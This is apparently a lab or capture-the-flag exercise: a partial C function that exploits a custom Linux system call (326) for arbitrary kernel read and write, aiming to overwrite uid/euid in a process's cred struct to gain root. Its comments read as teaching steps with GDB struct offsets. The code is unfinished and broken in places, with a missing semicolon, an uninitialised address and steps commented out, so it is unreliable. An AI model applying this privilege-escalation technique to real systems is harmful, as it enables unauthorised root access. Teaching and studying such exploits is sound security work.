void runExploit() {
    long* thread_info
    //unsigned long task, cred, uid;
    unsigned long x;

    // First, locate thread info using provided system call. Check kernel source code.
    syscall(326,0,NULL); //reset node array with 1 head node

    // Next, you need to find thread_info->task->cred
    //
    // 1.  Use GDB to calculate the offset in the structure and find what is the relationship between thread_info and thread_info->task, struct task and task->cred, struct cred and cred->uid/cred->euid.
    //     For example:
    //     (gdb) print (int)&((struct thread_info*)0)->task
    //     will gives you the offset between struct thread_info and  thread_info->task
    //     
    //          thread_info -> task = 0
    //          task_struct -> cred = 1456
    //          cred -> uid = 4
    //          cred -> euid = 20;
    //
    // 2. Then you can make use of arbitrary read to get the address of struct task.
    thread_info = syscall(326, 4, NULL);
    /*syscall(326, 2, thread_info - 4); //shift 4 bytes; modified previous pointer as thread_info
    task = syscall(326, 3, NULL); //thread_info now points to task

    // 3. Similarly, you can get the address of struct cred, uid/euid finally with the help of arbitrary read.
    syscall(326, 2, task + 1456 - 4);
    cred = syscall(326, 3, NULL); //thread_info now points to cred
    */

    syscall(326, 1, thread_info + 256); //Add 256 (0-255) nodes to idx to overwrite "next" to zero as it only contains 1 byte (8 bits).
    syscall(326, 2, x);         //set arbitrary address of x.

    // Finally, you will need to rewrite the uid/euid in cred struct and give your process highest privilege
    syscall(326, 3, NULL);      //Check if x contains highest priority
    syscall(326, 1, x);         //add node to address x; write complete!

    return;
}
